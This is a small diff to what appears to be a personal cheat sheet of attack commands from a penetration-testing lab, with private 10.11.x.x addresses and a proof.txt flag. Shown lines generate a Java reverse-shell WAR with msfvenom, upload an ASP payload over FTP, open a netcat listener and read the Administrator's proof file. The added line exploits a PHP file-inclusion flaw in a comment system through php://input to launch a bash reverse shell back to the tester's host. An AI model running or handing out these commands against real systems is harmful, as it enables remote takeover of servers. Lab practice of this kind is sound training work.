@@ -12,6 +12,9 @@ msfvenom -p java/shell_reverse_tcp LHOST=自己 LPORT=442 -f war > evil.war
 
 
 curl -X PUT -T "evil.asp" "ftp://10.11.1.14/wwwroot/"
+
+curl -s --data "<?system('bash -i >& /dev/tcp/10.11.0.131/443 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00" | egrep -v ' *<.*' | grep -v -i "check variable"
+
 http://10.11.1.14/evil.asp
 nc -lvp 443
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
